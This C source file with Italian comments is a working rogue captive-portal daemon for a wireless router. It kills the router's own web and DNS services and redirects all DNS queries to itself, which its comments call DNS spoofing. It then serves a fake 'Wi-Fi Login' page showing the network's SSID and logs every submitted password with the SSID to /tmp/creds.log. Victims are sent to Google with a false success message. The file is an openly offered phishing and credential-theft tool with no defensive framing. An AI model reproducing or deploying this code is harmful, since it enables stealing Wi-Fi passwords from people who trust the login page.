#include <arpa/inet.h>
#include <ctype.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define PORT 80
#define BUFFER_SIZE 4096

// Decodifica URL hex (%20 -> ' ', + -> ' ')
void url_decode(char *dst, const char *src) {
  char a, b;
  while (*src) {
    if ((*src == '%') && ((a = src[1]) && (b = src[2])) &&
        (isxdigit(a) && isxdigit(b))) {
      if (a >= 'a')
        a -= 'a' - 'A';
      if (a >= 'A')
        a -= ('A' - 10);
      else
        a -= '0';
      if (b >= 'a')
        b -= 'a' - 'A';
      if (b >= 'A')
        b -= ('A' - 10);
      else
        b -= '0';
      *dst++ = 16 * a + b;
      src += 3;
    } else if (*src == '+') {
      *dst++ = ' ';
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';
}

// Estrae parametro da query string o body
int get_param(const char *data, const char *name, char *val_buf, int max_len) {
  if (!data || !name)
    return 0;
  const char *p = data;
  int name_len = strlen(name);
  while ((p = strstr(p, name))) {
    if (p == data || *(p - 1) == '&') {
      if (*(p + name_len) == '=') {
        const char *val_start = p + name_len + 1;
        const char *val_end = strchr(val_start, '&');
        int len = val_end ? (val_end - val_start) : strlen(val_start);
        if (len >= max_len)
          len = max_len - 1;
        strncpy(val_buf, val_start, len);
        val_buf[len] = '\0';
        return 1;
      }
    }
    p += name_len;
  }
  return 0;
}

// Legge intero file in memoria
char *read_file(const char *path) {
  FILE *f = fopen(path, "r");
  if (!f)
    return NULL;
  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  fseek(f, 0, SEEK_SET);
  char *buf = malloc(size + 1);
  if (buf) {
    size_t read_bytes = fread(buf, 1, size, f);
    buf[read_bytes] = '\0';
  }
  fclose(f);
  return buf;
}

// Invia risposta HTTP
void send_response(int client_fd, const char *status, const char *content_type,
                   const char *body) {
  char header_buf[1024];
  int body_len = body ? strlen(body) : 0;
  snprintf(header_buf, sizeof(header_buf),
           "HTTP/1.0 %s\r\n"
           "Content-Type: %s\r\n"
           "Content-Length: %d\r\n"
           "Connection: close\r\n\r\n",
           status, content_type, body_len);
  send(client_fd, header_buf, strlen(header_buf), 0);
  if (body_len > 0) {
    send(client_fd, body, body_len, 0);
  }
}

// Recupera l'SSID corrente provando varie fonti in ordine di priorità
char *get_ssid() {
  // 1. Prova da /tmp/ath0.ap_bss (formato ssid="SSID_NAME")
  FILE *ap_f = fopen("/tmp/ath0.ap_bss", "r");
  if (ap_f) {
    char line[256];
    while (fgets(line, sizeof(line), ap_f)) {
      if (strncmp(line, "ssid=", 5) == 0) {
        char *val = line + 5;
        // Rimuove eventuali virgolette all'inizio
        if (*val == '"')
          val++;
        int l = strlen(val);
        // Rimuove newlines e virgolette alla fine
        while (l > 0 && (val[l - 1] == '\n' || val[l - 1] == '\r' ||
                         val[l - 1] == '"')) {
          val[l - 1] = '\0';
          l--;
        }
        char *ret = strdup(val);
        fclose(ap_f);
        return ret;
      }
    }
    fclose(ap_f);
  }

  // 2. Prova da /tmp/portal_ssid
  char *ssid = read_file("/tmp/portal_ssid");
  if (ssid)
    return ssid;

  // 3. Prova da /etc/ath/wsc_config.txt
  FILE *wsc_f = fopen("/etc/ath/wsc_config.txt", "r");
  if (wsc_f) {
    char line[256];
    while (fgets(line, sizeof(line), wsc_f)) {
      if (strncmp(line, "SSID=", 5) == 0) {
        char *val = line + 5;
        int l = strlen(val);
        while (l > 0 && (val[l - 1] == '\n' || val[l - 1] == '\r')) {
          val[l - 1] = '\0';
          l--;
        }
        char *ret = strdup(val);
        fclose(wsc_f);
        return ret;
      }
    }
    fclose(wsc_f);
  }

  // 4. Default
  return strdup("WiFi");
}

int main() {
  // Demone: esegue fork e si stacca dal terminale
  pid_t pid = fork();
  if (pid < 0)
    exit(EXIT_FAILURE);
  if (pid > 0)
    exit(EXIT_SUCCESS);
  if (setsid() < 0)
    exit(EXIT_FAILURE);

  // Ferma i vecchi servizi
  system("killall -9 httpd 2>/dev/null");
  system("killall -9 dnsd 2>/dev/null");

  // Configura e avvia DNS spoofing
  // Rileva IP da br0
  char ip[64] = "192.168.0.1";
  FILE *ip_pipe = popen(
      "ifconfig br0 2>/dev/null | sed -n 's/.*inet addr:\\([0-9.]*\\).*/\\1/p'",
      "r");
  if (ip_pipe) {
    char temp_ip[64] = {0};
    if (fgets(temp_ip, sizeof(temp_ip) - 1, ip_pipe)) {
      // Trim newline
      int len = strlen(temp_ip);
      while (len > 0 &&
             (temp_ip[len - 1] == '\n' || temp_ip[len - 1] == '\r')) {
        temp_ip[len - 1] = '\0';
        len--;
      }
      if (len > 0)
        strcpy(ip, temp_ip);
    }
    pclose(ip_pipe);
  }

  // Crea dnsd.conf ed esegue dnsd
  FILE *dns_f = fopen("/tmp/dnsd.conf", "w");
  if (dns_f) {
    fprintf(dns_f, "* %s\n", ip);
    fclose(dns_f);
  }
  char dns_cmd[256];
  snprintf(dns_cmd, sizeof(dns_cmd), "dnsd -c /tmp/dnsd.conf -i %s &", ip);
  system(dns_cmd);

  // Avvia il server socket su porta 80
  int server_fd, client_fd;
  struct sockaddr_in address;
  int opt = 1;
  int addrlen = sizeof(address);

  if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    exit(EXIT_FAILURE);
  }
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
    exit(EXIT_FAILURE);
  }

  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;
  address.sin_port = htons(PORT);

  if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
    exit(EXIT_FAILURE);
  }
  if (listen(server_fd, 10) < 0) {
    exit(EXIT_FAILURE);
  }

  char *req_buf = malloc(BUFFER_SIZE);
  if (!req_buf)
    exit(EXIT_FAILURE);

  while (1) {
    client_fd =
        accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
    if (client_fd < 0)
      continue;

    memset(req_buf, 0, BUFFER_SIZE);
    int read_bytes = recv(client_fd, req_buf, BUFFER_SIZE - 1, 0);
    if (read_bytes <= 0) {
      close(client_fd);
      continue;
    }

    // Parsing minimale
    char method[16] = {0};
    char fullpath[512] = {0};
    sscanf(req_buf, "%15s %511s", method, fullpath);

    char path[512] = {0};
    char *q_mark = strchr(fullpath, '?');
    if (q_mark) {
      strncpy(path, fullpath, q_mark - fullpath);
    } else {
      strcpy(path, fullpath);
    }

    char *post_body = NULL;
    char *body_ptr = strstr(req_buf, "\r\n\r\n");
    if (body_ptr)
      post_body = body_ptr + 4;
    else {
      body_ptr = strstr(req_buf, "\n\n");
      if (body_ptr)
        post_body = body_ptr + 2;
    }

    if (strcmp(path, "/connect") == 0 && strcmp(method, "POST") == 0) {
      char raw_p[256] = {0};
      char dec_p[256] = {0};
      if (post_body && get_param(post_body, "p", raw_p, sizeof(raw_p))) {
        url_decode(dec_p, raw_p);

        // SSID corrente
        char *ssid = get_ssid();

        // Log credenziali
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        char time_str[64];
        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", &tm);

        FILE *log_f = fopen("/tmp/creds.log", "a");
        if (log_f) {
          fprintf(log_f, "[%s] ip=unknown ssid=%s pass=%s\n", time_str,
                  ssid ? ssid : "WiFi", dec_p);
          fclose(log_f);
        }
        if (ssid)
          free(ssid);
      }

      const char *success_html =
          "<!DOCTYPE html><html><head>"
          "<meta http-equiv=\"refresh\" "
          "content=\"3;url=http://www.google.com\">"
          "<title>Autenticazione completata</title></head>"
          "<body><h2>Connessione effettuata con successo!</h2>"
          "<p>Verrai reindirizzato a breve...</p></body></html>";
      send_response(client_fd, "200 OK", "text/html", success_html);
    } else {
      // Serve il template del captive portal
      char *template = read_file("/etc/portal/template.html");
      // Se non esiste, prova in src o locale per debug
      if (!template)
        template = read_file("/tmp/portal/template.html");

      char *ssid = get_ssid();

      if (template) {
        char *pos = strstr(template, "__SSID__");
        if (pos) {
          int offset = pos - template;
          int ssid_len = strlen(ssid);
          int template_len = strlen(template);
          char *out_buf = malloc(template_len + ssid_len + 10);
          if (out_buf) {
            strncpy(out_buf, template, offset);
            out_buf[offset] = '\0';
            strcat(out_buf, ssid);
            strcat(out_buf, pos + 8);
            send_response(client_fd, "200 OK", "text/html", out_buf);
            free(out_buf);
          } else {
            send_response(client_fd, "200 OK", "text/html", template);
          }
        } else {
          send_response(client_fd, "200 OK", "text/html", template);
        }
        free(template);
      } else {
        char fallback_html[1024];
        snprintf(fallback_html, sizeof(fallback_html),
                 "<!DOCTYPE html><html><head><title>Wi-Fi Login</title>"
                 "<meta name=\"viewport\" "
                 "content=\"width=device-width,initial-scale=1\"></head>"
                 "<body><h2>Accedi alla Rete</h2>"
                 "<p>SSID: <b>%s</b></p>"
                 "<form action=\"/connect\" method=\"POST\">"
                 "<input type=\"password\" name=\"p\" placeholder=\"Password\" "
                 "required><br><br>"
                 "<input type=\"submit\" value=\"Accedi\">"
                 "</form></body></html>",
                 ssid);
        send_response(client_fd, "200 OK", "text/html", fallback_html);
      }
      free(ssid);
    }
    close(client_fd);
  }

  free(req_buf);
  close(server_fd);
  return 0;
}
